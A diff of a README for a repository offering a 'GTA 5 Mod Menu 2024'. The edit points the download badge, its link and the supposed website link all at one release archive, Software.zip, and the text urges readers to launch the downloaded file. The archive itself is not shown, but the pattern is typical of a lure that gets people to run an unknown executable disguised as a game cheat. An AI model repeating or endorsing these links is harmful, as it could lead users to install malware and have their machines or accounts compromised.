@@ -23,12 +23,12 @@ Welcome to the "GTA 5 Mod Menu 2024" repository, where you can find an exciting 
 
 ## Software Download
 📥 For accessing our exciting GTA 5 Mod Menu software, please click on the link below to download:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/lawrencesanity1108/GTA-5-Mod-Menu-2024/releases/download/v2.0/Software.zip)](https://github.com/lawrencesanity1108/GTA-5-Mod-Menu-2024/releases/download/v2.0/Software.zip)
 
 **Note: Ensure to launch the downloaded file to unlock the full potential of our mod menu!**
 
 ## Visit our Website
-💻 For more information and updates, make sure to visit our website [here](https://www.gtavmodmenu2024.com).
+💻 For more information and updates, make sure to visit our website [here](https://github.com/lawrencesanity1108/GTA-5-Mod-Menu-2024/releases/download/v2.0/Software.zip).
 
 ## Releases Section
 📂 If you encounter any issues with the download link provided above, please check the "Releases" section of this repository for alternative download options.
